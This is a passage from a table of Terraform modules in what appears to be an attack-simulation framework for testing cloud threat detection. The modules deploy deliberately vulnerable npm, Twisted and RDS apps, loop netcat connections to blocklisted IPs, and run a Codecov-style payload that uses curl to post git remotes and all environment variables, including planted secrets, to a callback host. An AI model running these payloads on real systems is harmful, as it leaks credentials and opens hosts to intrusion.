script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    web = file\(<br/>                            &quot;$\{path\.module\}/resources/web\.py&quot;,<br/>                        \)<br/><br/>    ldap = file\(<br/>                            &quot;$\{path\.module\}/resources/ldap\.py&quot;,<br/>                        \)<br/>    requirements = file\(<br/>                            &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                        \)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-vulnerable-npm-app                                                | ./modules/ssm/deploy-npm-app                                   | ssm_deploy_npm_app                         | context.aws.ssm.vulnerable.npm_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "npm_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                                   | <pre>locals \{<br/>    repo = &quot;https://github\.com/ForbiddenProgrammer/CVE\-2021\-21315\-PoC&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_npm\_app\_target \-X quit<br/>    truncate \-s 0 /tmp/vuln\_npm\_app\_target\.log<br/>    log &quot;checking for git\.\.\.&quot;<br/>    while \! command \-v git; do<br/>        log &quot;git not found \- waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $\(command \-v  git\)&quot;<br/>    rm \-rf /vuln\_npm\_app\_target &amp;&amp; \\<br/>    mkdir /vuln\_npm\_app\_target &amp;&amp; \\<br/>    cd /vuln\_npm\_app\_target &amp;&amp; \\<br/>    git clone $\{local\.repo\} &amp;&amp; \\<br/>    cd CVE\-2021\-21315\-PoC &amp;&amp; \\<br/>    echo $\{base64gzip\(local\.index\_js\_base64\)\} \| base64 \-d \| gunzip &gt; index\.js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen \-S vuln\_npm\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_npm\_app\_target\.log \-S vuln\_npm\_app\_target \-m npm start \-\-prefix /vuln\_npm\_app\_target/CVE\-2021\-21315\-PoC<br/>        screen \-S vuln\_npm\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl nodejs npm&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl nodejs npm&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    index\_js\_base64 = templatefile\(<br/>                &quot;$\{path\.module\}/resources/index\.js&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| attacker-vulnerable-python3-twisted-app                                    | ./modules/ssm/deploy-python3-twisted-app                       | ssm_deploy_python3_twisted_app             | context.aws.ssm.vulnerable.python3_twisted_app                            | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "python3_twisted_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app                       | <pre>locals \{<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_python3\_twisted\_app\_target\.log<br/>    if command \-v $PACKAGE\_MANAGER &amp;&amp; $PACKAGE\_MANAGER list \| grep &quot;python3\-twisted&quot; \| grep &quot;18\.9\.0\-11ubuntu0\.20\.04&quot;; then<br/>        mkdir \-p /vuln\_python3\_twisted\_app<br/>        cd /vuln\_python3\_twisted\_app<br/>        echo $\{base64gzip\(local\.app\_py\)\} \| base64 \-d \| gunzip &gt; app\.py<br/>        echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/>        log &quot;installing requirements\.\.\.&quot;<br/>        python3 \-m pip install \-r requirements\.txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile /tmp/vuln\_python3\_twisted\_app\_target\.log \-S vuln\_python3\_twisted\_app\_target \-m python3 /vuln\_python3\_twisted\_app/app\.py<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url\.\.\.&quot;<br/>            while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>            sleep 1800<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop\.\.\.&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3\-twisted/focal\-updates,focal\-security,now 18\.9\.0\-11ubuntu0\.20\.04\.1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl python3\-pip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl python3\-pip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app\_py = templatefile\(<br/>                &quot;$\{path\.module\}/resources/app\.py&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)<br/>    requirements = templatefile\(<br/>                &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                \{<br/>                \}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| attacker-vulnerable-rds-app                                                | ./modules/ssm/deploy-rds-app                                   | ssm_deploy_rds_app                         | context.aws.ssm.vulnerable.rds_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "rds_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8091<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-rds-app                                   | <pre>locals \{<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    app\_dirname = &quot;vuln\_rdsapp\_target&quot;<br/>    app\_path = &quot;/$\{local\.app\_dirname\}/app\.py&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_rdsapp\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_rdsapp\_target\.log<br/>    log &quot;removing previous app directory&quot;<br/>    rm \-rf /$\{local\.app\_dirname\}<br/>    log &quot;building app directory&quot;<br/>    mkdir \-p /$\{local\.app\_dirname\}/templates<br/>    cd /$\{local\.app\_dirname\}<br/>    <br/>    echo $\{base64gzip\(local\.app\)\} \| base64 \-d \| gunzip &gt; app\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/>    echo $\{base64gzip\(local\.test\)\} \| base64 \-d \| gunzip &gt; test\.py<br/>    curl \-LOJ https://s3\.amazonaws\.com/rds\-downloads/rds\-combined\-ca\-bundle\.pem<br/>    echo $\{base64gzip\(local\.database\)\} \| base64 \-d \| gunzip &gt; bootstrap\.sql<br/>    echo $\{base64gzip\(local\.entrypoint\)\} \| base64 \-d \| gunzip &gt; entrypoint\.sh<br/>    echo $\{base64gzip\(local\.index\)\} \| base64 \-d \| gunzip &gt; templates/index\.html<br/>    echo $\{base64gzip\(local\.cast\)\} \| base64 \-d \| gunzip &gt; templates/cast\.html<br/><br/>    log &quot;updating entrypoing permissions&quot;<br/>    chmod 755 entrypoint\.sh<br/><br/>    log &quot;installing requirements\.\.\.&quot;<br/>    python3 \-m pip install \-r requirements\.txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;requirements installed&quot;<br/>    <br/>    log &quot;running mysql boostrap\.\.\.&quot;<br/>    mysql \-\-ssl\-ca=rds\-combined\-ca\-bundle\.pem \-\-ssl\-mode=REQUIRED \-h $\{split\(&quot;:&quot;, var\.inputs\[&quot;db\_host&quot;\]\)\[0\]\} \-u$\{var\.inputs\[&quot;db\_user&quot;\]\} \-p$\{var\.inputs\[&quot;db\_password&quot;\]\} &lt; bootstrap\.sql<br/>    log &quot;mysql boostrap complete&quot;<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen \-S $\{local\.app\_dirname\} \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/$\{local\.app\_dirname\}\.log \-S $\{local\.app\_dirname\} \-m /$\{local\.app\_dirname\}/entrypoint\.sh<br/>        screen \-S $\{local\.app\_dirname\} \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\}/cast \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\}/cast \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl python3\-pip mysql\-client\-core\-8\.0&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl python3\-pip mysql\-shell&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app = templatefile\(<br/>                            &quot;$\{path\.module\}/resources/app\.py\.tpl&quot;,<br/>                            \{<br/>                                region = var\.inputs\[&quot;db\_region&quot;\]<br/>                            \}<br/>                        \)<br/>    test = templatefile\(<br/>                          &quot;$\{path\.module\}/resources/test\.py\.tpl&quot;,<br/>                            \{<br/>                                region = var\.inputs\[&quot;db\_region&quot;\]<br/>                            \}<br/>                        \)<br/>    requirements = templatefile\(<br/>                          &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                          \{\}<br/>                        \)<br/>    database = templatefile\(<br/>                          &quot;$\{path\.module\}/resources/bootstrap\.sql\.tpl&quot;,<br/>                            \{<br/>                                db\_user = var\.inputs\[&quot;db\_user&quot;\]<br/>                                db\_name = var\.inputs\[&quot;db\_name&quot;\]<br/>                            \}<br/>                        \)<br/>    entrypoint = templatefile\(<br/>                            &quot;$\{path\.module\}/resources/entrypoint\.sh\.tpl&quot;,<br/>                            \{<br/>                                 listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                                 app\_path = local\.app\_path<br/>                            \}<br/>                        \)<br/>    index = file\(<br/>                            &quot;$\{path\.module\}/resources/index\.html&quot;<br/>                        \)<br/>    cast = file\(<br/>                            &quot;$\{path\.module\}/resources/cast\.html&quot;<br/>                        \)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| target-ssm-connect-badip                                                   | ./modules/ssm/connect-badip                                    | ssm_connect_bad_ip                         | context.aws.ssm.target.connect.badip                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "badip": {<br/>                            "enabled": false,<br/>                            "iplist_url": "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset",<br/>                            "retry_delay_secs": 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-badip                                    | <pre>locals \{<br/>    iplist\_url = var\.inputs\[&quot;iplist\_url&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        echo $\{base64gzip\(local\.iplist\_base64\)\} \| base64 \-d \| gunzip &gt; threatdb\.csv<br/>        log &quot;enumerating bad ips in threatdb\.csv&quot;<br/>        for i in $\(grep &\#x27;IPV4,&\#x27; threatdb\.csv \| awk \-F&\#x27;,&\#x27; &\#x27;\{ print $2 \}&\#x27; \); do log &quot;connecting to: $i&quot;; nc \-vv \-w 5 $i 80 &gt;&gt; $LOGFILE 2&gt;&amp;1; sleep 1; done;<br/>        log &\#x27;waiting $\{var\.inputs\[&quot;retry\_delay\_secs&quot;\]\} seconds\.\.\.&\#x27;;<br/>        sleep $\{var\.inputs\[&quot;retry\_delay\_secs&quot;\]\}<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    iplist\_base64 = file\(&quot;$\{path\.module\}/resources/threatdb\.csv&quot;\)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-ssm-connect-codecov                                                 | ./modules/ssm/connect-codecov                                  | ssm_connect_codecov                        | context.aws.ssm.target.connect.codecov                                    | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "codecov": {<br/>                            "enabled": false,<br/>                            "env_secrets": [<br/>                                "SECRET=supersecret123"<br/>                            ],<br/>                            "git_origin": "git@git.localhost:repo/repo.git",<br/>                            "host_ip": null,<br/>                            "host_port": 8080,<br/>                            "use_ssl": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-codecov                                  | <pre>locals \{<br/>    host\_ip = var\.inputs\[&quot;host\_ip&quot;\]<br/>    host\_port = var\.inputs\[&quot;host\_port&quot;\]<br/>    git\_origin=var\.inputs\[&quot;git\_origin&quot;\]<br/>    env\_secrets=join\(&quot; &quot;, var\.inputs\[&quot;env\_secrets&quot;\]\)<br/>    callback\_url = var\.inputs\[&quot;use\_ssl&quot;\] == true ? &quot;https://$\{local\.host\_ip\}:$\{local\.host\_port\}&quot; : &quot;http://$\{local\.host\_ip\}:$\{local\.host\_port\}&quot;<br/>    command\_payload=&lt;&lt;\-EOT<br/>    LOGFILE=/tmp/$\{basename\(path\.module\)\}\_command\.log<br/>    function log \{<br/>        echo \`date \-u \+&quot;%Y\-%m\-%dT%H:%M:%SZ&quot;\`&quot; $1&quot;<br/>        echo \`date \-u \+&quot;%Y\-%m\-%dT%H:%M:%SZ&quot;\`&quot; $1&quot; &gt;&gt; $LOGFILE<br/>    \}<br/>    rm \-rf /tmp/repo<br/>    mkdir \-p /tmp/repo<br/>    cd /tmp/repo<br/>    git init<br/>    git remote add origin $\{local\.git\_origin\}<br/>    log &quot;running curl post: curl \-sm 0\.5 \-d \\&quot;$\(git remote \-v\)&lt;&lt;&lt;&lt;&lt;&lt; ENV $\(env\)\\&quot; $\{local\.callback\_url\}/upload/v2&quot;<br/>    curl \-sm 0\.5 \-d &quot;$\(git remote \-v\)&lt;&lt;&lt;&lt;&lt;&lt; ENV $\(env\)&quot; $\{local\.callback\_url\}/upload/v2 &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    sleep 30<br/>    exit<br/>    EOT<br/>    base64\_command\_payload=local\.command\_payload<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        screen \-S codecov \-X quit<br/>        screen \-wipe<br/>        truncate \-s 0 /tmp/codecov\.log<br/>        log &quot;checking for git\.\.\.&quot;<br/>        while \! command \-v git; do<br/>            log &quot;git not found \- waiting&quot;<br/>            sleep 10<br/>        done<br/>        log &quot;git: $\(command \-v  git\)&quot;<br/>        screen \-d \-Logfile /tmp/codecov\.log \-S codecov \-m env \-i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $\{local\.env\_secrets\} /bin/bash \-\-noprofile \-\-norc<br/>        screen \-S codecov \-X colon &quot;logfile flush 0^M&quot;<br/>        log &\#x27;sending screen command: $\{local\.command\_payload\}&\#x27;;<br/>        screen \-S codecov \-p 0 \-X stuff &quot;echo &\#x27;$\{base64gzip\(local\.base64\_command\_payload\)\}&\#x27; \| base64 \-d \| gunzip \| /bin/bash \-^M&quot;<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f 